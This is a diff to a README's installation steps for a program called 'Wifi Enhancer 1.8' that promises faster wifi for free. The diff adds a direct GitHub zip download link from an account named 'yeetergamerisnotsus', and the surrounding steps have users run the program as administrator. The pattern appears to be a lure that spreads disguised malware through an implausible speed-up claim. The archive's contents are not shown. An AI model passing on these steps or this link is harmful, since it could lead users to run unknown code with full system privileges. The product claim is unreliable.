@@ -57,3 +57,5 @@ Installation
 4. When you have finished that open the file then run "Wifi Enhancer 1.8" as administrator.
 
 5. Enjoy Your upgraded and faster wifi for free
+
+**NOTE** If you cannot install the zip paste this into your browser https://github.com/yeetergamerisnotsus/Wifi-Enhancer/archive/refs/heads/main.zip
